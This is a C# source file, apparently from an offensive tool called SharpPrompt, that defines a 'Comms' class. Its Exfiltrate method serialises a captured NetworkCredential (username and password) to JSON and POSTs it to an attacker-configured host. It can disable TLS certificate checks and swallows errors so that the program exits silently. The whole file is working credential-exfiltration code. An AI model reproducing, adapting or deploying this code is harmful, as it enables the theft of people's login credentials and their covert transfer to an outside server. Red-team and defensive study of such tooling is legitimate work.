using System.Net.Http;
using System.IO;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Json;
using System.Text;
using System.Threading.Tasks;
using System.Net;

namespace SharpPrompt
{
    [DataContract]
    internal class Comms
    {
        public string Host { get; set; }
        public bool HTTPS { get; set; }

        private static byte[] Serialize<T>(T data)
        {
            var serializer = new DataContractJsonSerializer(typeof(T));
            using (var ms = new MemoryStream())
            {
                serializer.WriteObject(ms, data);
                return ms.ToArray();
            }
        }

        private async Task PostHttps(StringContent content, bool skipCertificateValidation)
        {
            using (var handler = new HttpClientHandler())
            {
                if (skipCertificateValidation)
                {
                    handler.ServerCertificateCustomValidationCallback = (message, cert, chain, sslPolicyErrors) => true;
                }
                using (var client = new HttpClient(handler))
                {
                    try
                    {
                        if (Host.StartsWith("https://"))
                        {
                            await client.PostAsync($"{Host}", content);
                        }
                        await client.PostAsync($"https://{Host}", content);
                    }
                    catch
                    {
                        // just return so the program silently exits
                        return;
                    }
                }
            }

        }

        private async Task PostHttp(StringContent content)
        {
            using (var handler = new HttpClientHandler())
            {
                using (var client = new HttpClient(handler))
                {
                    try
                    {
                        if (Host.StartsWith("http://"))
                        {
                            await client.PostAsync($"{Host}", content);
                        }
                        await client.PostAsync($"http://{Host}", content);
                    }
                    catch
                    {
                        return;
                    }
                }
            }
        }

        public async Task Exfiltrate(NetworkCredential creds)
        {
            var data = Serialize(creds);
            StringContent content = new StringContent(Encoding.UTF8.GetString(data), Encoding.UTF8, "application/json");
            if (HTTPS)
            {
                await PostHttps(content, false);
                return;
            }
            if (Host.StartsWith("https://"))
            {
                await PostHttps(content, true);
                return;
            }
            await PostHttp(content);
        }
    }
}
